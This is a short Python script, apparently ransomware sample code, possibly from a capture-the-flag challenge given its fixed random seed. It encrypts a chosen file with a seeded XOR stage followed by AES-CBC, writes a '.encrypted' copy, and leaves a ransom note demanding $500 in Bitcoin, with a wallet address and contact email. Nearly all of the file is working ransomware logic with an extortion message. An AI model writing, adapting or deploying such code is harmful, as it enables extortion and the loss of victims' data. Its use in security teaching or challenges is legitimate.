import argparse
import random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


header = '''

  __  __         ____                          _____                             _             
 |  \/  |_   _  / ___| _   _ _ __   ___ _ __  | ____|_ __   ___ _ __ _   _ _ __ | |_ ___  _ __ 
 | |\/| | | | | \___ \| | | | '_ \ / _ \ '__| |  _| | '_ \ / __| '__| | | | '_ \| __/ _ \| '__|
 | |  | | |_| |  ___) | |_| | |_) |  __/ |    | |___| | | | (__| |  | |_| | |_) | || (_) | |   
 |_|  |_|\__, | |____/ \__,_| .__/ \___|_|    |_____|_| |_|\___|_|   \__, | .__/ \__\___/|_|   
         |___/              |_|                                      |___/|_|                  
@nan0shade
'''

print(header)

# Create the argument parser

parser = argparse.ArgumentParser(description='Encrypt a file.')
parser.add_argument('-i', '--input', help='Input file name')

# Parse the command-line arguments
args = parser.parse_args()

# Check if the input file name is provided
if not args.input:
    print('Please provide the input file name using -i or --input.')
    exit()

# Set the random seed
random.seed(0xBC7F2023)


def encrypt_file(file_path):
    try:
        # Encryption stage 1
        with open(file_path, 'r') as file:
            plaintext = file.read()
        print(len(plaintext))

        ciphertext1 = b''
        for byte in plaintext:
            encrypted_byte = ((ord(byte) ^ random.randint(1, 100))+3)# XOR each byte with the random number
            ciphertext1 += bytes([encrypted_byte])
            nextRand = random.randint(1,100)*55 //255
        
        # Encryption stage 2
        # Generate a random initialization vector (IV)
        iv = random.randbytes(AES.block_size)
        key = random.getrandbits(128)
        print(iv)
        print(key)

        cipher = AES.new(key.to_bytes(16, 'big'), AES.MODE_CBC, iv)
        ciphertext2 = cipher.encrypt(pad(ciphertext1, AES.block_size))

        encrypted_file_path = file_path + '.encrypted'


        with open(encrypted_file_path, 'wb') as file:
            file.write(ciphertext2)

        with open("Message_for_you.txt", 'w') as file:
            file.writelines("I have encrypted your files, and in order to regain access to them, you must make a payment of $500 in Bitcoin within 15-days.\nThe Bitcoin address for the payment is 0xf23BaCC03b790bC6fCA46D0FF738Ec2e8819875F\nAdditionally, send me an email with your payment proof  to nanoshade@tutanota.com ")
        
        

        print('File encrypted successfully.')
        print(f'Encrypted file: {encrypted_file_path}')

    except FileNotFoundError:
        print(f'Error: File not found at {file_path}')

# Encrypt the specified file
encrypt_file(args.input)
